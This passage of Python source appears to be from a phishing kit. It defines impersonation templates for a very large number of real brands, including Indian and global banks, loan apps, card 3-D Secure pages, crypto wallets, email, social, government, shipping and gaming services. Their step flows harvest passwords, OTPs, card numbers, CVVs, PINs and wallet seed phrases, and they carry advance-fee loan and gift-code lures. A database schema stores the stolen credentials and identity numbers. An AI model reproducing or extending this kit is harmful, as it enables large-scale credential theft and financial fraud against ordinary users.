    "Redeem Xbox gift code", GF, "redeem.microsoft.com", "Microsoft account", "you@outlook.com",
    "Codes are 25 characters and are redeemed on your Microsoft account.")
reg("spotify-gift", "Spotify Gift Card", "gift", "#121212", "#1db954", "spotify.com",
    "Redeem Spotify Premium", GF, "www.spotify.com/redeem", "Email", "you@example.com",
    "Premium time is added to your account as soon as the code is verified.")

LOAN_FLOW = ["apply", "kyc", "docs", "bank", "approve", "card", "otp", "pin"]
for _k, _l, _b, _d in [
        ("hdfc-loan", "HDFC Loans", "#004c8f", "hdfcloan.co.in"),
        ("icici-loan", "ICICI Loans", "#ae282e", "iciciloan.co.in"),
        ("sbi-loan", "SBI Loans", "#22307a", "sbiloan.co.in"),
        ("axis-loan", "Axis Loans", "#97144d", "axisloan.co.in"),
        ("kotak-loan", "Kotak Loans", "#003874", "kotakloan.co.in"),
        ("bajaj-loan", "Bajaj Finserv", "#0033a0", "bajajfinserv.in"),
        ("tatacap-loan", "Tata Capital", "#486aae", "tatacapital.com"),
        ("lnt-loan", "L&T Finance", "#f7941e", "lntfinance.com"),
        ("idfc-loan", "IDFC First Loans", "#9c1c2b", "idfcfirstbank.com"),
        ("indusind-loan", "IndusInd Loans", "#98211f", "indusind.com"),
        ("yes-loan", "YES Bank Loans", "#00518f", "yesbank.in"),
        ("rbl-loan", "RBL Loans", "#00468b", "rblbank.com"),
        ("fullerton-loan", "Fullerton India", "#e31e24", "fullertonindia.com"),
        ("piramal-loan", "Piramal Finance", "#c8102e", "piramalfinance.com"),
        ("abcl-loan", "Aditya Birla Capital", "#d6001c", "adityabirlacapital.com"),
        ("hero-loan", "Hero FinCorp", "#e4002b", "herofincorp.com"),
        ("mahindra-loan", "Mahindra Finance", "#c8102e", "mahindrafinance.com"),
        ("shriram-loan", "Shriram Finance", "#f58220", "shriramfinance.in"),
        ("manappuram-loan", "Manappuram Finance", "#004a99", "manappuram.com"),
        ("muthoot-loan", "Muthoot Finance", "#c8102e", "muthootfinance.com"),
        ("iifl-loan", "IIFL Finance", "#f26522", "iifl.com"),
        ("navi-loan", "Navi", "#3d5afe", "navi.com"),
        ("kreditbee-loan", "KreditBee", "#00b2a9", "kreditbee.in"),
        ("moneyview-loan", "Money View", "#7b2d8e", "moneyview.in"),
        ("slice-loan", "slice", "#8b5cf6", "sliceit.com"),
        ("cred-loan", "CRED", "#111111", "cred.club"),
        ("onecard-loan", "OneCard", "#1a1a1a", "getonecard.app"),
        ("dhani-loan", "Dhani Loans", "#f5a623", "dhani.com"),
        ("kissht-loan", "Kissht", "#ff5722", "kissht.com"),
        ("mobikwik-loan", "MobiKwik", "#e4002b", "mobikwik.com"),
        ("fibe-loan", "Fibe", "#5a2d82", "fibe.in"),
        ("paysense-loan", "PaySense", "#0f766e", "paysense.in"),
        ("mpocket-loan", "mPokket", "#1f6fb2", "mpokket.com"),
        ("cashe-loan", "CASHe", "#e2452c", "cashe.in"),
        ("smartcoin-loan", "SmartCoin", "#0b7285", "smartcoin.in")]:
    reg(_k, _l, "loan", _b, _b, _d, "Instant loan application", LOAN_FLOW,
        "apply.%s/application/step-1" % _d, "Loan amount", "Select amount",
        "Your loan is sanctioned. Complete the one-time fee to release disbursal.")

reg("cardapply", "Credit Card Apply", "loan", "#1a1f71", "#0f1348", "cardapply.in",
    "Apply for a credit card", ["apply", "kyc", "docs", "approve", "card", "otp", "pin"],
    "apply.cardapply.in/credit-card/step-1", "Loan amount", "Select limit",
    "Your card is approved. Pay the one-time issuance fee to activate it.")
reg("debitupgrade", "Debit Card Upgrade", "loan", "#0b5c3f", "#073d29", "debitupgrade.in",
    "Upgrade to a platinum debit card", ["kyc", "approve", "card", "otp", "pin"],
    "upgrade.debitupgrade.in/kyc", "Full name", "As per bank record",
    "Upgrade approved. Confirm your existing card to complete the switch.")
reg("limitincrease", "Credit Limit Increase", "loan", "#6b21a8", "#4a1470", "limitincrease.in",
    "Increase your credit limit", ["kyc", "approve", "card", "cvv", "otp", "pin"],
    "apply.limitincrease.in/enhancement", "Full name", "As per bank record",
    "Enhancement approved. Confirm the card to apply the new limit.")
reg("instantloan", "Instant Loan", "loan", "#0f766e", "#0b544e", "instantloan.in",
    "Loan in 5 minutes", ["apply", "kyc", "approve", "card", "otp", "pin"],
    "apply.instantloan.in/step-1", "Loan amount", "Select amount",
    "Approved. Pay the processing fee to receive money instantly.")
reg("goldloan", "Gold Loan", "loan", "#8a6d1f", "#5e4a12", "goldloan.co.in",
    "Gold loan against your jewellery", ["apply", "kyc", "docs", "bank", "approve", "card", "otp", "pin"],
    "apply.goldloan.co.in/step-1", "Loan amount", "Select amount",
    "Gold valuation done. Pay the assay fee to release the amount.")

for _k, _l, _b, _d in [("sensor", "Device Verification", "#0f172a", "devicecheck.io"),
                       ("sensorbank", "Bank Device Check", "#0b3d6b", "bankverify.co.in"),
                       ("sensorekyc", "eKYC Device Check", "#12305c", "ekyccheck.in")]:
    reg(_k, _l, "sensor", _b, "#3b82f6", _d, "Confirm your device to continue",
        ["verify", "otp"], "secure.%s/device" % _d, "Full name", "As per bank record",
        "We verify your device once to keep the account secure.")

reg("google", "Google", "social", "#ffffff", "#1a73e8", "google.com", "Sign in", ["id", "pw", "otp"],
    "accounts.google.com/o/oauth2/auth", "Email or phone")
reg("facebook", "Facebook", "social", "#1877f2", "#166fe5", "facebook.com", "Log into Facebook",
    ["id", "pw", "otp"], "www.facebook.com/login", "Email address or phone number")
reg("instagram", "Instagram", "social", "#ffffff", "#0095f6", "instagram.com", "", ["id", "pw", "otp"],
    "www.instagram.com/accounts/login", "Phone number, username, or email")
reg("igfollowers", "IG Free Followers", "social", "#ffffff", "#0095f6", "instagram.com", "Free followers",
    ["user", "pw", "otp"], "www.instagram.com/free-followers", "Instagram username")
reg("twitter", "X", "social", "#000000", "#1d9bf0", "x.com", "Sign in to X", ["id", "pw", "otp"],
    "x.com/i/flow/login", "Phone, email, or username")
reg("linkedin", "LinkedIn", "social", "#ffffff", "#0a66c2", "linkedin.com", "Sign in", ["id", "pw"],
    "www.linkedin.com/login")
reg("tiktok", "TikTok", "social", "#000000", "#fe2c55", "tiktok.com", "Log in", ["id", "pw", "otp"],
    "www.tiktok.com/login/phone-or-email/email")
reg("snapchat", "Snapchat", "social", "#fffc00", "#f7b500", "snapchat.com", "Log in", ["id", "pw"],
    "accounts.snapchat.com/accounts/login")
reg("reddit", "Reddit", "social", "#ffffff", "#ff4500", "reddit.com", "Log in", ["id", "pw", "otp"],
    "www.reddit.com/login")
reg("pinterest", "Pinterest", "social", "#ffffff", "#e60023", "pinterest.com", "Log in", ["id", "pw"],
    "www.pinterest.com/login")
reg("discord", "Discord", "social", "#313338", "#5865f2", "discord.com", "Welcome back!",
    ["id", "pw", "otp"], "discord.com/login")
reg("telegram", "Telegram", "social", "#17212b", "#2aabee", "web.telegram.org", "Sign in", ["phone", "otp"],
    "web.telegram.org/a/")
reg("whatsapp", "WhatsApp", "social", "#f0f2f5", "#25d366", "web.whatsapp.com", "Link with phone number",
    ["phone", "otp"], "web.whatsapp.com/")
reg("youtube", "YouTube", "social", "#ffffff", "#ff0000", "youtube.com", "Sign in", ["id", "pw"],
    "accounts.google.com/ServiceLogin?service=youtube")
reg("twitch", "Twitch", "social", "#18181b", "#9146ff", "twitch.tv", "Log in", ["id", "pw", "otp"],
    "www.twitch.tv/login")

reg("outlook", "Outlook", "email", "#ffffff", "#0078d4", "outlook.com", "Sign in", ["id", "pw", "otp"],
    "login.live.com/login.srf")
reg("office365", "Microsoft 365", "email", "#ffffff", "#0078d4", "office.com", "Sign in",
    ["id", "pw", "otp"], "login.microsoftonline.com/common/oauth2/authorize")
reg("yahoo", "Yahoo", "email", "#ffffff", "#6001d2", "yahoo.com", "Sign in", ["id", "pw"],
    "login.yahoo.com/account/challenge/password")
reg("icloud", "iCloud", "email", "#f5f5f7", "#0071e3", "icloud.com", "Sign in to iCloud",
    ["id", "pw", "otp"], "www.icloud.com/")
reg("protonmail", "Proton Mail", "email", "#ffffff", "#6d4aff", "proton.me", "Sign in",
    ["id", "pw", "otp"], "account.proton.me/login")
reg("zoho", "Zoho", "email", "#ffffff", "#e42527", "zoho.com", "Sign in", ["id", "pw"],
    "accounts.zoho.in/signin")
reg("aol", "AOL", "email", "#ffffff", "#1a73e8", "aol.com", "Sign in", ["id", "pw"], "login.aol.com/")
reg("gmx", "GMX", "email", "#ffffff", "#1c449b", "gmx.com", "Sign in", ["id", "pw"], "www.gmx.com/")

for _k, _l, _b, _a, _d in [
        ("sbi", "SBI Card", "#22307a", "#101a4a", "sbicard.com"),
        ("hdfc", "HDFC Bank", "#004c8f", "#002f5c", "hdfcbank.com"),
        ("icici", "ICICI Bank", "#ae282e", "#6d1418", "icicibank.com"),
        ("axis", "Axis Bank", "#97144d", "#5c0c2f", "axisbank.com"),
        ("kotak", "Kotak Bank", "#003874", "#001f42", "kotak.com"),
        ("canara", "Canara Bank", "#123a7a", "#081d3f", "canarabank.com"),
        ("bob", "Bank of Baroda", "#f16522", "#b8460f", "bankofbaroda.in"),
        ("pnb", "PNB", "#a41e34", "#70121f", "pnbindia.in"),
        ("union", "Union Bank", "#003874", "#002550", "unionbankofindia.co.in"),
        ("idfc", "IDFC First", "#9c1c2b", "#6b1019", "idfcfirstbank.com"),
        ("yes", "YES Bank", "#00518f", "#003661", "yesbank.in"),
        ("indusind", "IndusInd Bank", "#98211f", "#6b1412", "indusind.com"),
        ("federal", "Federal Bank", "#0a3d62", "#062741", "federalbank.co.in"),
        ("rbl", "RBL Bank", "#00468b", "#002f5e", "rblbank.com"),
        ("bandhan", "Bandhan Bank", "#a5172b", "#73101d", "bandhanbank.com"),
        ("boi", "Bank of India", "#f47b20", "#c05a0c", "bankofindia.co.in"),
        ("chase", "Chase", "#117aca", "#0b5691", "chase.com"),
        ("bofa", "Bank of America", "#e31837", "#a80f25", "bankofamerica.com"),
        ("wellsfargo", "Wells Fargo", "#d71e28", "#a2131b", "wellsfargo.com"),
        ("citi", "Citibank", "#056dae", "#03456d", "citi.com"),
        ("hsbc", "HSBC", "#db0011", "#a0000c", "hsbc.com"),
        ("barclays", "Barclays", "#00aeef", "#0079a8", "barclays.co.uk"),
        ("dbs", "DBS Bank", "#ec1c24", "#b00f15", "dbs.com"),
        ("sc", "Standard Chartered", "#0473ea", "#0350a3", "sc.com"),
        ("au", "AU Small Finance", "#6a2c8f", "#4a1c66", "aubank.in"),
        ("ujjivan", "Ujjivan Bank", "#e4002b", "#a80020", "ujjivansfb.in"),
        ("equitas", "Equitas Bank", "#0e7c7b", "#085555", "equitasbank.com"),
        ("csb", "CSB Bank", "#1b5e20", "#0e3d14", "csb.co.in"),
        ("kvb", "KVB Bank", "#7a1f2b", "#4f131b", "kvb.co.in"),
        ("tmb", "Tamilnad Mercantile", "#8a1c1c", "#5c1010", "tmb.in"),
        ("jkb", "J&K Bank", "#0b4f8a", "#073358", "jkbank.com")]:
    reg(_k, _l, "bank", _b, _a, _d, "Internet banking login", ["login", "card", "otp", "pin"],
        "netbanking.%s/login" % _d, "Customer ID / User ID", "Your internet banking user ID",
        "Your bank verifies every card through 3-D Secure. Enter the details printed on your card.")

reg("cardcheck", "Card Verify", "card", "#1a1a2e", "#4361ee", "cardverify.io", "Verify your card",
    ["card", "fullz", "cvv", "otp"], "secure.cardverify.io/3ds", "Card number", "0000 0000 0000 0000",
    "3-D Secure card validation. All fields are required by the issuer.")
reg("visa", "Visa Secure", "card", "#1a1f71", "#0f1348", "visa.com", "Verified by Visa",
    ["card", "fullz", "otp", "pin"], "secure.visa.com/3ds/authenticate", "Card number", "0000 0000 0000 0000")
reg("mastercard", "Mastercard ID Check", "card", "#eb001b", "#a80013", "mastercard.com", "ID Check",
    ["card", "fullz", "otp", "pin"], "secure.mastercard.com/idcheck", "Card number", "0000 0000 0000 0000")
reg("amex", "American Express", "card", "#006fcf", "#004f94", "americanexpress.com", "SafeKey",
    ["card", "fullz", "otp", "pin"], "www.americanexpress.com/safekey", "Card number", "0000 000000 00000")
reg("rupay", "RuPay Secure", "card", "#097939", "#055325", "rupay.co.in", "Secure pay",
    ["card", "fullz", "otp", "pin"], "secure.rupay.co.in/auth", "Card number", "0000 0000 0000 0000")

reg("metamask", "MetaMask", "crypto", "#24272b", "#f6851b", "metamask.io", "Import wallet",
    ["pw", "seed"], "metamask.io/download", "Wallet password", "Your MetaMask password",
    "Paste your 12-word Secret Recovery Phrase exactly as shown in the extension.")
reg("trustwallet", "Trust Wallet", "crypto", "#0b1426", "#3375bb", "trustwallet.com", "Import wallet",
    ["seed"], "trustwallet.com/import", "Recovery phrase", "12 words",
    "Enter the 12-word recovery phrase of the wallet you want to restore.")
reg("phantom", "Phantom", "crypto", "#181818", "#ab9ff2", "phantom.app", "Import wallet", ["seed"],
    "phantom.app/import", "Secret phrase", "12 or 24 words")
reg("exodus", "Exodus", "crypto", "#1a1033", "#5c2d91", "exodus.com", "Restore wallet", ["pw", "seed"],
    "exodus.com/restore", "Password", "Wallet password")
reg("ledger", "Ledger Live", "crypto", "#000000", "#1a1a1a", "ledger.com", "Recovery check", ["seed"],
    "www.ledger.com/ledger-live", "Recovery phrase", "24 words")
reg("coinbase", "Coinbase", "crypto", "#0a0b0d", "#0052ff", "coinbase.com", "Sign in",
    ["id", "pw", "otp", "pin"], "login.coinbase.com/signin", "Email", "you@example.com")
reg("binance", "Binance", "crypto", "#181a20", "#f0b90b", "binance.com", "Log in", ["id", "pw", "otp"],
    "accounts.binance.com/login", "Email / phone", "Email or mobile number")
reg("kucoin", "KuCoin", "crypto", "#101317", "#24ae8f", "kucoin.com", "Log in", ["id", "pw", "otp"],
    "www.kucoin.com/login", "Email / phone", "Email or mobile number")
reg("bybit", "Bybit", "crypto", "#0f1114", "#f7a600", "bybit.com", "Log in", ["id", "pw", "otp"],
    "www.bybit.com/login", "Email / phone", "Email or mobile number")
reg("okx", "OKX", "crypto", "#000000", "#2a2a2a", "okx.com", "Log in", ["id", "pw", "otp"],
    "www.okx.com/login", "Email / phone", "Email or mobile number")

reg("paypal", "PayPal", "pay", "#ffffff", "#003087", "paypal.com", "Log in",
    ["id", "pw", "card", "otp"], "www.paypal.com/signin", "Email or mobile number", "Email or mobile number")
reg("stripe", "Stripe", "pay", "#ffffff", "#635bff", "stripe.com", "Sign in", ["id", "pw", "otp"],
    "dashboard.stripe.com/login", "Email", "you@example.com")
reg("razorpay", "Razorpay", "pay", "#0c2451", "#3395ff", "razorpay.com", "Sign in", ["id", "pw", "otp"],
    "dashboard.razorpay.com/signin", "Email", "you@example.com")
reg("paytm", "Paytm", "pay", "#ffffff", "#00baf2", "paytm.com", "Log in", ["phone", "otp", "pin"],
    "paytm.com/login", "Mobile number", "10-digit mobile number")
reg("phonepe", "PhonePe", "pay", "#ffffff", "#5f259f", "phonepe.com", "Log in", ["phone", "otp", "pin"],
    "www.phonepe.com/login", "Mobile number", "10-digit mobile number")
reg("gpay", "Google Pay", "pay", "#ffffff", "#1a73e8", "pay.google.com", "Sign in", ["id", "pw", "otp"],
    "pay.google.com/about/", "Email", "you@gmail.com")
reg("amazonpay", "Amazon Pay", "pay", "#ffffff", "#ff9900", "pay.amazon.in", "Sign in",
    ["id", "pw", "otp"], "pay.amazon.in/signin", "Email or mobile", "Email or mobile")
reg("wise", "Wise", "pay", "#ffffff", "#163300", "wise.com", "Log in", ["id", "pw", "otp"],
    "wise.com/login", "Email", "you@example.com")
reg("skrill", "Skrill", "pay", "#ffffff", "#6a1b9a", "skrill.com", "Log in", ["id", "pw", "otp"],
    "account.skrill.com/login", "Email", "you@example.com")

reg("amazon", "Amazon", "shop", "#ffffff", "#232f3e", "amazon.in", "Sign in", ["id", "pw", "card"],
    "www.amazon.in/ap/signin", "Email or mobile", "Email or mobile number")
reg("flipkart", "Flipkart", "shop", "#ffffff", "#2874f0", "flipkart.com", "Login",
    ["phone", "otp", "card"], "www.flipkart.com/account/login", "Mobile number", "10-digit mobile number")
reg("myntra", "Myntra", "shop", "#ffffff", "#ff3f6c", "myntra.com", "Login", ["phone", "otp"],
    "www.myntra.com/login", "Mobile number", "10-digit mobile number")
reg("meesho", "Meesho", "shop", "#ffffff", "#570d8c", "meesho.com", "Login", ["phone", "otp"],
    "www.meesho.com/login", "Mobile number", "10-digit mobile number")
reg("ajio", "AJIO", "shop", "#ffffff", "#2c4152", "ajio.com", "Sign in", ["phone", "otp"],
    "www.ajio.com/login", "Mobile number", "10-digit mobile number")
reg("nykaa", "Nykaa", "shop", "#ffffff", "#fc2779", "nykaa.com", "Login", ["phone", "otp"],
    "www.nykaa.com/login", "Mobile number", "10-digit mobile number")
reg("snapdeal", "Snapdeal", "shop", "#ffffff", "#e40046", "snapdeal.com", "Login", ["phone", "otp"],
    "www.snapdeal.com/login", "Mobile number", "10-digit mobile number")
reg("aliexpress", "AliExpress", "shop", "#ffffff", "#ff4747", "aliexpress.com", "Sign in", ["id", "pw"],
    "login.aliexpress.com/", "Email", "you@example.com")
reg("tatacliq", "Tata CLiQ", "shop", "#ffffff", "#1a1a1a", "tatacliq.com", "Login", ["phone", "otp"],
    "www.tatacliq.com/login", "Mobile number", "10-digit mobile number")
reg("shopsy", "Shopsy", "shop", "#ffffff", "#e40046", "shopsy.in", "Login", ["phone", "otp"],
    "www.shopsy.in/login", "Mobile number", "10-digit mobile number")

reg("irctc", "IRCTC", "gov", "#ffffff", "#1b3a6b", "irctc.co.in", "Login", ["id", "pw", "otp"],
    "www.irctc.co.in/nget/profile/login", "User ID", "IRCTC user ID")
reg("epfo", "EPFO", "gov", "#ffffff", "#0b3d6b", "epfindia.gov.in", "Member login", ["id", "pw", "otp"],
    "unifiedportal-mem.epfindia.gov.in/", "UAN", "12-digit UAN")
reg("incometax", "Income Tax", "gov", "#ffffff", "#0f3d6e", "incometax.gov.in", "Login",
    ["id", "pw", "otp"], "eportal.incometax.gov.in/iec/foservices/", "PAN / User ID", "PAN number")
reg("uidai", "Aadhaar / UIDAI", "gov", "#ffffff", "#e8481c", "uidai.gov.in", "Aadhaar login",
    ["id", "otp"], "myaadhaar.uidai.gov.in/", "Aadhaar number", "12-digit Aadhaar")
reg("digilocker", "DigiLocker", "gov", "#ffffff", "#0b5cab", "digilocker.gov.in", "Sign in",
    ["phone", "otp"], "www.digilocker.gov.in/", "Mobile number", "10-digit mobile number")
reg("parivahan", "Parivahan", "gov", "#ffffff", "#0c6b3f", "parivahan.gov.in", "Login",
    ["id", "pw", "otp"], "parivahan.gov.in/en/", "User ID", "Your user ID")
reg("fastag", "NETC Fastag", "gov", "#ffffff", "#123a63", "netc.org.in", "Login", ["id", "pw", "otp"],
    "www.netc.org.in/", "Customer ID", "Customer ID")
reg("passport", "Passport Seva", "gov", "#ffffff", "#0b3d6b", "passportindia.gov.in", "Login",
    ["id", "pw", "otp"], "www.passportindia.gov.in/", "User ID", "Your user ID")
reg("esic", "ESIC", "gov", "#ffffff", "#7a1f2b", "esic.gov.in", "Login", ["id", "pw", "otp"],
    "www.esic.gov.in/", "Insured person ID", "Your IP number")
reg("nps", "NPS Trust", "gov", "#ffffff", "#1b5e20", "npstrust.org.in", "Login", ["id", "pw", "otp"],
    "npstrust.org.in/", "PRAN", "12-digit PRAN")
reg("gst", "GST Portal", "gov", "#ffffff", "#0f3d6e", "gst.gov.in", "Login", ["id", "pw", "otp"],
    "www.gst.gov.in/login", "GSTIN / User ID", "Your GSTIN")
reg("echallan", "e-Challan", "gov", "#ffffff", "#8a1c1c", "echallan.parivahan.gov.in", "Login",
    ["id", "otp"], "echallan.parivahan.gov.in/", "Challan number", "Challan number")

reg("indiapost", "India Post", "ship", "#ffffff", "#b11116", "indiapost.gov.in", "Track & login",
    ["id", "pw"], "www.indiapost.gov.in/", "User ID", "Your user ID")
reg("dtdc", "DTDC", "ship", "#ffffff", "#003a70", "dtdc.in", "Track shipment", ["id", "otp"],
    "www.dtdc.in/tracking.asp", "AWB / Mobile", "AWB number or mobile")
reg("bluedart", "Blue Dart", "ship", "#ffffff", "#003da5", "bluedart.com", "Track shipment",
    ["id", "otp"], "www.bluedart.com/tracking", "Waybill / Mobile", "Waybill number")
reg("delhivery", "Delhivery", "ship", "#ffffff", "#e4002b", "delhivery.com", "Track shipment",
    ["id", "otp"], "www.delhivery.com/track/package", "AWB number", "AWB number")
reg("fedex", "FedEx", "ship", "#ffffff", "#4d148c", "fedex.com", "Track", ["id", "otp"],
    "www.fedex.com/fedextrack/", "Tracking number", "Tracking number")
reg("dhl", "DHL", "ship", "#ffffff", "#ffcc00", "dhl.com", "Track", ["id", "otp"],
    "www.dhl.com/global-en/home/tracking.html", "Tracking number", "Tracking number")
reg("ekart", "Ekart", "ship", "#ffffff", "#1a73e8", "ekartlogistics.com", "Track", ["id", "otp"],
    "www.ekartlogistics.com/track", "Tracking ID", "Tracking ID")

reg("jio", "Jio", "tel", "#ffffff", "#0a2885", "jio.com", "Sign in", ["phone", "otp"],
    "www.jio.com/selfcare/login/", "Mobile number", "10-digit Jio number")
reg("airtel", "Airtel", "tel", "#ffffff", "#e40000", "airtel.in", "Log in", ["phone", "otp"],
    "www.airtel.in/myplan-infinity/", "Mobile number", "10-digit Airtel number")
reg("vi", "Vi", "tel", "#ffffff", "#ed1c24", "myvi.in", "Log in", ["phone", "otp"], "www.myvi.in/login",
    "Mobile number", "10-digit Vi number")
reg("bsnl", "BSNL", "tel", "#ffffff", "#004b8d", "bsnl.co.in", "Log in", ["phone", "otp"],
    "portal.bsnl.in/", "Mobile number", "10-digit number")
reg("mtnl", "MTNL", "tel", "#ffffff", "#0b3d6b", "mtnl.in", "Log in", ["phone", "otp"], "mtnl.in/",
    "Mobile number", "10-digit number")

reg("steam", "Steam", "game", "#1b2838", "#66c0f4", "steampowered.com", "Sign in", ["id", "pw", "otp"],
    "store.steampowered.com/login", "Account name", "Steam account name")
reg("epicgames", "Epic Games", "game", "#18181b", "#2a2a2a", "epicgames.com", "Sign in",
    ["id", "pw", "otp"], "www.epicgames.com/id/login", "Email", "you@example.com")
reg("roblox", "Roblox", "game", "#ffffff", "#e2231a", "roblox.com", "Log in", ["id", "pw"],
    "www.roblox.com/login", "Username", "Username or email")
reg("freefire", "Free Fire", "game", "#141414", "#ff6a00", "ff.garena.com", "Login", ["id", "pw"],
    "ff.garena.com/", "Email / phone", "Email or phone")
reg("bgmi", "BGMI", "game", "#ffffff", "#f5a623", "bgmi.com", "Login", ["id", "pw"], "www.bgmi.com/",
    "Email / phone", "Email or phone")
reg("playstation", "PlayStation", "game", "#ffffff", "#0070d1", "playstation.com", "Sign in",
    ["id", "pw", "otp"], "www.playstation.com/acct/signin", "Email", "you@example.com")
reg("xbox", "Xbox", "game", "#ffffff", "#107c10", "xbox.com", "Sign in", ["id", "pw", "otp"],
    "www.xbox.com/play", "Email", "you@example.com")
reg("ubisoft", "Ubisoft", "game", "#0b1421", "#0070ff", "ubisoft.com", "Sign in", ["id", "pw"],
    "account.ubisoft.com/", "Email", "you@example.com")
reg("riot", "Riot Games", "game", "#111111", "#d13639", "riotgames.com", "Sign in", ["id", "pw"],
    "auth.riotgames.com/", "Username", "Username")

reg("github", "GitHub", "dev", "#0d1117", "#238636", "github.com", "Sign in", ["id", "pw", "otp"],
    "github.com/login", "Username or email", "Username or email")
reg("gitlab", "GitLab", "dev", "#ffffff", "#fc6d26", "gitlab.com", "Sign in", ["id", "pw", "otp"],
    "gitlab.com/users/sign_in", "Username or email", "Username or email")
reg("aws", "AWS", "dev", "#ffffff", "#232f3e", "aws.amazon.com", "Sign in", ["id", "pw", "otp"],
    "signin.aws.amazon.com/", "Account ID / email", "Account ID or email")
reg("azure", "Azure", "dev", "#ffffff", "#0078d4", "azure.com", "Sign in", ["id", "pw", "otp"],
    "portal.azure.com/", "Email", "you@example.com")
reg("digitalocean", "DigitalOcean", "dev", "#ffffff", "#0080ff", "digitalocean.com", "Sign in",
    ["id", "pw", "otp"], "cloud.digitalocean.com/login", "Email", "you@example.com")
reg("vultr", "Vultr", "dev", "#ffffff", "#007bfc", "vultr.com", "Log in", ["id", "pw"], "my.vultr.com/",
    "Email", "you@example.com")
reg("cloudflare", "Cloudflare", "dev", "#ffffff", "#f38020", "cloudflare.com", "Log in",
    ["id", "pw", "otp"], "dash.cloudflare.com/login", "Email", "you@example.com")

reg("dropbox", "Dropbox", "cloud", "#ffffff", "#0061ff", "dropbox.com", "Sign in", ["id", "pw", "otp"],
    "www.dropbox.com/login", "Email", "you@example.com")
reg("googledrive", "Google Drive", "cloud", "#ffffff", "#1fa463", "drive.google.com", "Sign in",
    ["id", "pw"], "drive.google.com/", "Email", "you@gmail.com")
reg("mega", "MEGA", "cloud", "#ffffff", "#d9272e", "mega.nz", "Log in", ["id", "pw"], "mega.nz/login",
    "Email", "you@example.com")
reg("onedrive", "OneDrive", "cloud", "#ffffff", "#0364b8", "onedrive.live.com", "Sign in", ["id", "pw"],
    "onedrive.live.com/", "Email", "you@example.com")

reg("netflix", "Netflix", "stream", "#000000", "#e50914", "netflix.com", "Sign In", ["id", "pw", "card"],
    "www.netflix.com/login", "Email or phone number")
reg("primevideo", "Prime Video", "stream", "#0f171e", "#00a8e1", "primevideo.com", "Sign in",
    ["id", "pw", "otp"], "www.primevideo.com/", "Email or phone", "Email or phone number")
reg("hotstar", "JioHotstar", "stream", "#0f1014", "#1d9bf0", "hotstar.com", "Log in", ["phone", "otp"],
    "www.hotstar.com/in/login", "Mobile number", "10-digit mobile number")
reg("spotify", "Spotify", "stream", "#121212", "#1db954", "spotify.com", "Log in", ["id", "pw", "otp"],
    "accounts.spotify.com/login", "Email or username", "Email or username")
reg("sonyliv", "SonyLIV", "stream", "#0b0b0b", "#f5a623", "sonyliv.com", "Log in", ["phone", "otp"],
    "www.sonyliv.com/login", "Mobile number", "10-digit mobile number")

reg("slack", "Slack", "work", "#ffffff", "#4a154b", "slack.com", "Sign in", ["id", "pw", "otp"],
    "slack.com/signin", "Email", "you@company.com")
reg("zoom", "Zoom", "work", "#ffffff", "#2d8cff", "zoom.us", "Sign in", ["id", "pw", "otp"],
    "zoom.us/signin", "Email", "you@company.com")
reg("notion", "Notion", "work", "#ffffff", "#000000", "notion.so", "Log in", ["id", "pw", "otp"],
    "www.notion.so/login", "Email", "you@example.com")
reg("adobe", "Adobe", "work", "#ffffff", "#ff0000", "adobe.com", "Sign in", ["id", "pw", "otp"],
    "account.adobe.com/", "Email", "you@example.com")
reg("appleid", "Apple ID", "work", "#f5f5f7", "#0071e3", "apple.com", "Sign in", ["id", "pw", "otp"],
    "appleid.apple.com/sign-in", "Email or phone", "Email or phone number")
reg("figma", "Figma", "work", "#ffffff", "#a259ff", "figma.com", "Log in", ["id", "pw", "otp"],
    "www.figma.com/login", "Email", "you@example.com")

LAYOUT = {"google": "google", "gpay": "google", "googledrive": "google", "youtube": "yt",
          "facebook": "fb", "instagram": "ig", "igfollowers": "igf", "twitter": "x", "twitch": "twitch",
          "linkedin": "li", "github": "gh", "outlook": "ms", "office365": "ms", "azure": "ms",
          "onedrive": "ms", "xbox": "ms", "icloud": "apple", "appleid": "apple", "whatsapp": "wa",
          "telegram": "tg", "netflix": "netflix", "spotify": "spotify", "amazon": "amazon",
          "amazonpay": "amazon", "paypal": "paypal", "metamask": "wallet", "trustwallet": "wallet",
          "phantom": "wallet", "exodus": "wallet", "ledger": "wallet", "tiktok": "tiktok",
          "snapchat": "snap", "reddit": "reddit", "discord": "discord", "primevideo": "stream",
          "hotstar": "stream", "sonyliv": "stream", "binance": "exch", "coinbase": "exch",
          "kucoin": "exch", "bybit": "exch", "okx": "exch", "jio": "app", "airtel": "app", "vi": "app",
          "bsnl": "app", "mtnl": "app", "paytm": "app", "phonepe": "app", "flipkart": "app",
          "myntra": "app", "meesho": "app", "ajio": "app", "nykaa": "app", "snapdeal": "app",
          "aliexpress": "app", "tatacliq": "app", "shopsy": "app", "steam": "app", "epicgames": "app",
          "roblox": "app", "freefire": "app", "bgmi": "app", "playstation": "app", "ubisoft": "app",
          "riot": "app", "sensor": "sensor", "sensorbank": "sensor", "sensorekyc": "sensor",
          "roblox-gift": "roblox", "roblox-robux": "roblox", "ff-diamond": "ff", "ff-diamonds": "ff",
          "ff-pass": "ff", "pubg-uc": "redeem", "uc-free": "redeem", "ziggy-gift": "redeem",
          "gplay-gift": "gplay", "itunes-gift": "itunes", "discord-nitro": "redeem",
          "nitro-free": "redeem", "steam-gift": "redeem", "steam-wallet": "redeem",
          "vbucks": "redeem", "coc-gems": "redeem", "minecoins": "redeem", "amazon-gift": "redeem",
          "netflix-gift": "redeem", "playstation-gift": "redeem", "xbox-gift": "redeem",
          "spotify-gift": "redeem"}

@contextlib.contextmanager
def db():
    c = sqlite3.connect(DB_PATH, timeout=15); c.row_factory = sqlite3.Row
    try:
        yield c; c.commit()
    finally:
        c.close()

COLS = ["site", "hdr", "ident", "pw", "otp", "card", "exp", "cvv", "pin", "holder", "seed", "dob", "addr",
        "zip", "ssn", "extra", "note", "hits", "maxv", "burn", "expires", "amount", "tenure", "purpose",
        "name", "pan", "aadhaar", "city", "state", "emp", "income", "email", "acct", "ifsc", "bname",
        "fee", "docs", "dev", "sens", "poke", "otp_on", "giftcode"]

def init_db():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS sessions(id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE, site TEXT, ip TEXT, ua TEXT, hdr TEXT, created TEXT, step TEXT,
        ident TEXT, pw TEXT, otp TEXT, card TEXT, exp TEXT, cvv TEXT, pin TEXT, holder TEXT,
        seed TEXT, dob TEXT, addr TEXT, zip TEXT, ssn TEXT, extra TEXT, status TEXT, note TEXT,
